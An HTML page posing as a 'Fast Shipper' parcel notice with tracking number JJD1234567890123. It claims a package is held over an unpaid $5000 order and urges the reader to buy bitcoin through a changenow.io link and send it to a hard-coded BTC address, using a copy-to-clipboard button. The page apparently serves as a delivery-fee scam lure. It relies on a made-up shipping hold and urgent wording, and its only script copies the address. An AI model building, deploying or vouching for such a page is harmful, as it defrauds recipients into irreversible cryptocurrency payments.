<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Processing Package - Fast Shipper JJD1234567890123</title>
    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="css/style.css">
    <style>
        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        .copy-address {
            margin-top: 20px;
            padding: 15px;
            background-color: #f1f1f1;
            border-radius: 8px;
            position: relative;
        }

        .copy-address input[type="text"] {
            width: calc(100% - 32px);
            padding: 10px;
            border: none;
            background-color: transparent;
            outline: none;
            font-size: 16px;
        }

        .copy-button {
            margin-top: 10px;
            padding: 8px 15px;
            background-color: #007bff;
            color: #fff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .copy-button:hover {
            background-color: #0056b3;
        }

        .amount-green {
            color: green;
        }

        .amount-red {
            color: red;
        }

        ul {
            list-style-type: none;
            padding: 0;
        }

        li {
            display: inline-block;
            margin-right: 20px;
        }

        li:last-child {
            margin-right: 0;
        }
    </style>
</head>

<body>
    <div class="container text-center">
        <h1 class="mt-5">Unpaid Order: <span class="amount-red">$5000</span></h1>
        <p class="lead">Your package is being processed, but payment is pending.</p>
        <h2>Shipping on Hold</h2>
        <p>Please complete your payment to proceed.</p>
        <p>Copy the payment address before proceeding to our <a href="https://changenow.io/?from=usd&to=btc&fiatMode=true&amount=5000">payment server</a>:</p>
        <p>
            <button type="button" onclick="window.location.href='https://changenow.io/?from=usd&to=btc&fiatMode=true&amount=5000'">Pay Now!</button>
        </p>
        <div class="copy-address">
            <p>Copy the BTC payment address below:</p>
            <input type="text" value="17PUWxgkjNTLqpWHc5XCUHvkFDAdZu9JrF" id="cryptoAddress" readonly>
            <button class="copy-button" onclick="copyAddress()">Copy</button>
        </div>
    </div>

    <footer class="site-footer">
        <div class="container">
            <div class="row pt-5 mt-5 text-center">
                <div class="col-md-12">
                    <div class="border-top pt-5">
                        <p>
                            <a href="index.html">Back to Home</a> <br>
                            <a href="mailto:customer.care@fastshipper.org">Customer Care</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <script>
        function copyAddress() {
            var copyText = document.getElementById("cryptoAddress");
            copyText.select();
            document.execCommand("copy");
            alert("Address copied to clipboard: " + copyText.value);
        }
    </script>
</body>

</html>
